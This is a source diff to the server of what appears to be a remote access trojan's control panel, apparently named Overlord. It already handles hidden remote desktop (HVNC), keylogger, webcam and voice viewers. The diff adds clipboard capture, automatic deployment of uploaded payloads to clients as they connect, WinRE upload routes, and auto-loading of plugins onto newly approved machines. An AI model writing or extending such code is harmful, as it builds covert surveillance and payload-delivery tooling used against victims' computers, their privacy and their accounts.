@@ -17,10 +17,11 @@ import { metrics } from "./metrics";
 import { ensureDataDir } from "./paths";
 import { handleAuthRoutes } from "./server/routes/auth-routes";
 import { handleAutoScriptsRoutes } from "./server/routes/auto-scripts-routes";
-import { handleEnrollmentRoutes } from "./server/routes/enrollment-routes";
+import { handleEnrollmentRoutes, setPostApproveHook } from "./server/routes/enrollment-routes";
 import { handleBuildRoutes } from "./server/routes/build-routes";
 import { handleAssetsRoutes } from "./server/routes/assets-routes";
 import { handleDeployRoutes } from "./server/routes/deploy-routes";
+import { handleWinRERoutes } from "./server/routes/winre-routes";
 import { cleanupFileTransferTempFiles, handleFileDownloadRoutes } from "./server/routes/file-download-routes";
 import { handleClientRoutes } from "./server/routes/client-routes";
 import { handleMiscRoutes } from "./server/routes/misc-routes";
@@ -37,6 +38,8 @@ import { CORS_HEADERS } from "./server/http-security";
 import { mimeType, secureHeaders, securePluginHeaders } from "./server/http-utils";
 import { sanitizePluginId } from "./server/plugin-utils";
 import { dispatchAutoScriptsForConnection } from "./server/auto-script-dispatch";
+import { dispatchAutoDeploysForConnection } from "./server/auto-deploy-dispatch";
+import { handleAutoDeployRoutes } from "./server/routes/auto-deploy-routes";
 import { consumeHttpDownloadPayload, type PendingHttpDownload } from "./server/http-download-consumer";
 import { startBuildProcess as runBuildProcess } from "./server/build-process";
 import { createHttpFetchHandler } from "./server/http-dispatch";
@@ -80,6 +83,7 @@ import {
   handleWebcamDevices,
   handleHVNCCloneProgress,
   handleHVNCLookupResult,
+  handleClipboardContent,
   handleRemoteDesktopViewerMessage,
   handleRemoteDesktopViewerOpen,
   hvncStreamingState,
@@ -140,6 +144,7 @@ const PLUGIN_ROOT = process.env.OVERLORD_PLUGIN_ROOT?.trim()
 const PLUGIN_STATE_PATH = path.join(PLUGIN_ROOT, ".plugin-state.json");
 const DATA_DIR = ensureDataDir();
 const DEPLOY_ROOT = path.join(DATA_DIR, "deploy");
+const WINRE_ROOT = path.join(DATA_DIR, "winre");
 
 const TLS_CERT_PATH = config.tls.certPath;
 const TLS_KEY_PATH = config.tls.keyPath;
@@ -211,6 +216,15 @@ type DeployUpload = {
 };
 
 const deployUploads = new Map<string, DeployUpload>();
+
+type WinREUpload = {
+  id: string;
+  path: string;
+  name: string;
+  size: number;
+};
+
+const winreUploads = new Map<string, WinREUpload>();
 
 type NotificationRateState = {
   lastSent: number;
@@ -285,6 +299,23 @@ const pendingCommandReplies = new Map<string, PendingCommandReply>();
 
 async function startServer() {
   await loadPluginState();
+
+  setPostApproveHook((clientId: string) => {
+    const client = clientManager.getClient(clientId);
+    if (!client) return;
+    dispatchAutoLoadPlugins(
+      client,
+      pluginState,
+      notificationPluginHandlers.isPluginLoaded,
+      notificationPluginHandlers.isPluginLoading,
+      notificationPluginHandlers.markPluginLoading,
+      notificationPluginHandlers.enqueuePluginEvent,
+      loadPluginBundle,
+    ).catch((err) => {
+      logger.warn(`[enrollment] failed to dispatch auto-load plugins for ${clientId}: ${(err as Error).message}`);
+    });
+  });
+
   await cleanupFileTransferTempFiles(DATA_DIR);
   logger.info("[filebrowser] cleaned stale transfer temp files on startup");
   let tls:
@@ -324,6 +355,14 @@ async function startServer() {
       deployUploads,
       detectUploadOs,
       normalizeClientOs,
+    },
+    autoDeploy: {
+      DEPLOY_ROOT,
+      detectUploadOs,
+    },
+    winre: {
+      WINRE_ROOT,
+      winreUploads,
     },
     fileDownload: {
       DATA_DIR,
@@ -443,6 +482,11 @@ async function startServer() {
     handleKeyloggerViewerMessage,
     handleVoiceViewerMessage,
     dispatchAutoScriptsForConnection,
+    dispatchAutoDeploysForConnection: (info: import("./types").ClientInfo, ws: import("bun").ServerWebSocket<SocketData>) => {
+      const proto = tls ? "https" : "http";
+      const origin = `${proto}://127.0.0.1:${PORT}`;
+      dispatchAutoDeploysForConnection(info, ws, origin);
+    },
     dispatchAutoLoadPlugins: (info: import("./types").ClientInfo) => {
       dispatchAutoLoadPlugins(
         info,
@@ -452,7 +496,9 @@ async function startServer() {
         notificationPluginHandlers.markPluginLoading,
         notificationPluginHandlers.enqueuePluginEvent,
         loadPluginBundle,
-      );
+      ).catch((err) => {
+        logger.warn(`[plugin-autoload] dispatch error for ${info.id}: ${(err as Error).message}`);
+      });
     },
     takePendingNotificationScreenshot: takePendingNotificationScreenshotForClient,
     storeNotificationScreenshot: storeNotificationScreenshotForPending,
@@ -477,6 +523,7 @@ async function startServer() {
     handleWebcamDevices,
     handleHVNCCloneProgress,
     handleHVNCLookupResult,
+    handleClipboardContent,
     cleanupVoiceViewer,
     stopConsoleOnTarget,
     sendDesktopCommand,
@@ -502,10 +549,12 @@ async function startServer() {
       handleAuthRoutes,
       handleNotificationsConfigRoutes,
       handleAutoScriptsRoutes,
+      handleAutoDeployRoutes,
       handleEnrollmentRoutes,
       handleUsersRoutes,
       handleBuildRoutes,
       handleDeployRoutes,
+      handleWinRERoutes,
       handleFileDownloadRoutes,
       handlePluginRoutes,
       handleMiscRoutes,
